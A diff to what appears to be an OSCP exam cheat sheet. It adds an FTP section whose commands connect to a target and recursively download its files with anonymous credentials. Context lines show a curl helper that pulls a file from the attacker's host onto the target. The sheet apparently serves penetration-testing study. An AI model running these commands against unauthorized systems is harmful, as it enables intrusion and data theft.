@@ -36,6 +36,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [curl](https://github.com/0xsyr0/OSCP#curl)
 		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
 		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
+  		- [FTP](https://github.com/0xsyr0/OSCP#ftp)
 		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
 		- [Ligolo-ng](https://github.com/0xsyr0/OSCP#ligolo-ng)
 		- [Linux](https://github.com/0xsyr0/OSCP#linux)
@@ -600,6 +601,13 @@ function __curl() {
 
 ```c
 __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+```
+
+#### FTP
+
+```c
+ftp <RHOST>
+wget -r ftp://anonymous:anonymous@<RHOST>
 ```
 
 #### Kerberos
